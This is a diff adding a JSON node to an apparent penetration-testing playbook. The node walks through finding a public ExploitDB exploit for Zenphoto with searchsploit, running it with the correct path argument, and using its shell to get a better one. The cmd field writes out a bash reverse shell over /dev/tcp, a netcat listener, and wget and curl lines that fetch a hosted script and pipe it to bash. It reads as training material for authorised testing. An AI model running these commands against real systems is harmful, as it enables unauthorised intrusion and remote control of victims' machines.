@@ -1,0 +1,34 @@
+{
+  "id": "searchsploit_workflow",
+  "phase": "WEB",
+  "title": "Run a Public Exploit \u2014 searchsploit, Args, Path Gotchas",
+  "body": "You have 'CMS X version Y' and a matching ExploitDB entry. This is the mechanics of actually RUNNING it without burning 20 minutes on argument and path mistakes.\n\nCOPY, don't run-in-place: 'searchsploit -m <id>' copies the exploit into your cwd so you can read and edit it. ALWAYS read the usage header first \u2014 run it with no args and it prints how it wants to be called (host + path, host + port, etc).\n\nTHE PATH/SLASH GOTCHA: web exploits take the app's base path, and a trailing slash often matters. 'php 18083.php $ip /test' may fail where 'php 18083.php $ip /test/' works \u2014 the exploit concatenates the path and a missing slash breaks the target URL. If the exploit 'connects' but every command returns 'failed', try toggling the trailing slash before assuming the exploit is broken.\n\nTHE FLAKY-CHANNEL PROBLEM: an exploit's built-in shell (e.g. 'zenphoto-shell#') is often a fragile single request-per-command channel \u2014 intermittent, no TTY, dies on complex payloads. The moment it works at all, use it to pull a REAL shell: host a script and pipe it to bash (see hosted_shell). Don't fight the exploit's shell; bootstrap out of it.",
+  "cmd": "# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 1. Find + COPY the exploit (read before running)\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nsearchsploit zenphoto                       # match your exact version\nsearchsploit -m 18083                        # -m copies it to ./ to read/edit\nphp 18083.php                                # no args -> prints the usage header\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 2. Run with the right args \u2014 mind the trailing slash\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nphp 18083.php $ip /test/                      # NOTE: /test/ (with slash) \u2014 /test may fail\n#   if it 'connects' but whoami returns failed -> toggle the trailing slash and retry\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 3. Bootstrap out of the flaky exploit shell into a real one\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Kali: host the script + start a listener (different ports is fine)\ncat > shell.sh <<'EOF'\n#!/bin/bash\nbash -i >& /dev/tcp/$lhost/$lport 0>&1\nEOF\npython3 -m http.server 8090                  # one terminal\nnc -nlvp $lport                              # another terminal\n\n# in the exploit shell \u2014 fetch + pipe to bash (no temp file needed):\nwget -qO- http://$lhost:8090/shell.sh | bash\n# alt if wget is odd:  curl -s http://$lhost:8090/shell.sh | bash",
+  "warn": "Read the exploit source before running \u2014 public PoCs can be sabotaged or destructive (see the evaluate-public-exploits node). For the path arg: when in doubt, try WITH and WITHOUT the trailing slash \u2014 it's the single most common reason a working exploit 'fails'. And don't waste time stabilising the exploit's own shell; the first successful command should fetch a proper reverse shell.",
+  "choices": [
+    {
+      "label": "Read it first \u2014 is this PoC safe?",
+      "next": "evaluate_public_exploits"
+    },
+    {
+      "label": "Exploit shell is flaky \u2014 stage a real shell",
+      "next": "hosted_shell"
+    },
+    {
+      "label": "Caught the reverse shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Shell landed \u2014 upgrade the TTY",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Exploit needs C/source fixes to compile",
+      "next": "exploit_fix_c"
+    },
+    {
+      "label": "Back to CVE hunt",
+      "next": "searchsploit_web"
+    }
+  ]
+}
